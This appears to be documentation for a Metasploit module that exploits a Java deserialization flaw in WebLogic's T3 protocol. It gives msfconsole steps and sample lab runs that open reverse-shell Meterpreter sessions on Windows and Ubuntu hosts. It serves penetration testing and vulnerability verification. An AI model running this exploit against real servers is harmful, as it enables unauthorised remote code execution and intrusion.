## Vulnerable Application

  There exists a Java object deserialization vulnerability
  in multiple versions of WebLogic.

  Unauthenticated remote code execution can be achieved by
  sending a serialized `BadAttributeValueExpException`
  object over the T3 protocol to vulnerable versions of
  WebLogic. Leveraging an `ExtractorComparator` enables
  the ability to trigger `method.invoke()`, which will
  execute arbitrary code.

  This module has been tested on WebLogic versions
  `v12.2.1.4.0`, `v12.2.1.3.0`, and `v12.1.3.0.0`.

### Installation

  WebLogic versions can be downloaded from [here](https://www.oracle.com/middleware/technologies/weblogic-server-installers-downloads.html).

  Some version of Java 8 JDK is required to be installed on the server.
  This module has been tested successfully using [jdk8u251](https://www.oracle.com/java/technologies/javase-jdk8-downloads.html).

  Installation instructions for WebLogic can be found [here](https://docs.oracle.com/cd/E24705_01/doc.91/e21052/appx_install_wls.htm#EOPWC376).

  On step 10 of the installation instructions, keep the
  `Run Quickstart` box checked and click `done`. A new window
  should pop up. Select `Create a new domain` -> `next`.
  Ensure `Basic WebLogic Server Domain` is selected and click `next`.
  Create credentials and select `next`. Domain mode can be either
  `Production` or `Development`, then click `next`. Click `next` again
  and select `Create`. Click `next` a couple more times, then click
  `finish`.

  To start WebLogic, execute the `startWebLogic` script in
  `Oracle/Middleware/Oracle_Home/user_projects/domains/base_domain/`.

## Verification Steps

  1. Install the application
  2. Start msfconsole
  3. Do: ```use exploit/multi/misc/weblogic_deserialize_badattr_extcomp```
  4. Do: ```set RHOSTS <target_ip>```
  5. Do: ```set LHOSTS <attacker_ip>```
  6. Do: ```set TARGET <0 for Windows or 1 for *NIX>```
  7. Do: ```run```
  8. You should get a shell.

## Scenarios
### WebLogic `v12.2.1.4.0` on Windows 10

  ```
  msf5 > use exploit/multi/misc/weblogic_deserialize_badattr_extcomp
  msf5 exploit(multi/misc/weblogic_deserialize_badattr_extcomp) > set rhosts 172.16.215.181
  rhosts => 172.16.215.181
  msf5 exploit(multi/misc/weblogic_deserialize_badattr_extcomp) > set lhost 172.16.215.1
  lhost => 172.16.215.1
  msf5 exploit(multi/misc/weblogic_deserialize_badattr_extcomp) > run

  [*] Started reverse TCP handler on 172.16.215.1:4444
  [*] 172.16.215.181:7001 - Executing automatic check (disable AutoCheck to override)
  [*] 172.16.215.181:7001 - WebLogic version detected: 12.2.1.4.0
  [+] 172.16.215.181:7001 - The target appears to be vulnerable.
  [*] 172.16.215.181:7001 - Sending handshake...
  [*] 172.16.215.181:7001 - Formatting payload...
  [*] 172.16.215.181:7001 - Sending object...
  [*] Sending stage (176195 bytes) to 172.16.215.181
  [*] Meterpreter session 1 opened (172.16.215.1:4444 -> 172.16.215.181:49724) at 2020-06-02 14:03:07 -0500

  meterpreter > getuid
  Server username: DESKTOP-AQT4EG1\space
  meterpreter > sysinfo
  Computer        : DESKTOP-AQT4EG1
  OS              : Windows 10 (10.0 Build 18362).
  Architecture    : x64
  System Language : en_US
  Domain          : WORKGROUP
  Logged On Users : 2
  Meterpreter     : x86/windows
  ```

### WebLogic `v12.2.1.4.0` on Ubuntu 18.04

  ```
  msf5 exploit(multi/misc/weblogic_deserialize_badattr_extcomp) > set target 1
  target => 1
  msf5 exploit(multi/misc/weblogic_deserialize_badattr_extcomp) > set rhosts 172.16.215.180
  rhosts => 172.16.215.180
  msf5 exploit(multi/misc/weblogic_deserialize_badattr_extcomp) > run

  [*] Started reverse TCP handler on 172.16.215.1:4444
  [*] 172.16.215.180:7001 - Executing automatic check (disable AutoCheck to override)
  [*] 172.16.215.180:7001 - WebLogic version detected: 12.2.1.4.0
  [+] 172.16.215.180:7001 - The target appears to be vulnerable.
  [*] 172.16.215.180:7001 - Sending handshake...
  [*] 172.16.215.180:7001 - Formatting payload...
  [*] 172.16.215.180:7001 - Sending object...
  [*] Sending stage (980808 bytes) to 172.16.215.180
  [*] Meterpreter session 2 opened (172.16.215.1:4444 -> 172.16.215.180:50522) at 2020-06-02 14:03:43 -0500
  [*] 172.16.215.180:7001 - Command Stager progress - 101.56% done (715/704 bytes)

  meterpreter > getuid
  Server username: no-user @ ubuntu (uid=1000, gid=1000, euid=1000, egid=1000)
  meterpreter > sysinfo
  Computer     : 172.16.215.180
  OS           : Ubuntu 18.04 (Linux 5.3.0-51-generic)
  Architecture : x64
  BuildTuple   : i486-linux-musl
  Meterpreter  : x86/linux
  ```
